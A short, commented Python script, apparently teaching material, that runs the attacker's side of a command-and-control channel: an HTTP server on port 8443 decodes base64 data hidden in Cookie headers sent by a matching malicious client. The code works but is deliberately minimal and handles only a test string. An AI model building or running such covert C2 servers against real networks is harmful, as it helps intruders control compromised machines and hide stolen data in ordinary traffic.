# This script sets up a basic HTTP server that only fulfills requests from the malicious HTTP client.

from http.server import BaseHTTPRequestHandler, HTTPServer
# Python's http.server library allow the language to implement an HTTP server. It requires the programmer to program request handling.
from base64 import b64decode,b64encode

class C2Server(BaseHTTPRequestHandler):
    def do_GET(self):
        data = b64decode(self.headers["Cookie"]).decode("utf-8").rstrip()
        print("Received: %s"%data)
        # In this case, the malicious actor only wants to process GET requests, and knows data is hidden in cookie headers, 
        # so the function only locates and decodes the data found there.
        if data == "C2 data":
            response = b64encode(bytes("Received","utf-8"))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(response)
        else:
            self.send_error(404)
        # Responds with 200 and simple message if finds the desired message, otherwise responds with "Page not found."
        # Again, this implementation is very bare bones, and would require more meat to fool anyone. But it does the job.

if __name__ == "__main__":
    hostname = ""
    port = 8443
    # This info matches the client-side script.
    webServer = HTTPServer((hostname,port),C2Server)
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    webServer.server_close()
    # Keeps the web server online until manually interrupted.
